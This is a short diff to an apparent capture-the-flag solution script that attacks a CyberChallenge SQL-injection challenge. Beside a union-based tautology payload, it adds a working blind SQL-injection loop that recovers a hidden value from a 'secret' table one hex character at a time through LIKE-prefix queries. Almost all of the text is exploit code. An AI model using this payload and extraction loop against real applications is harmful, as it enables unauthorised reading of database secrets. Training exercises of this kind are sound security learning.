@@ -45,3 +45,20 @@ inj = Inj('http://sqlinjection.challs.cyberchallenge.it/blind#4')
 
 result, error = inj.union("1' or '1'='1") # will make a request to the 'union' endpoint
 print(result, error)
+
+payload = "1' and (select 1 from secret where HEX(asecret) LIKE '{}%')='1"
+inj = Inj('http://ip:5100')
+
+dictionary = '0123456789abcdef'
+result = ''
+
+while True:
+
+    for c in dictionary:
+        question = payload.format(result + c)  
+        response, error = inj.blind(question)
+        if response == 'Success': # We have a match!
+            result += c
+            break
+    else:
+        break
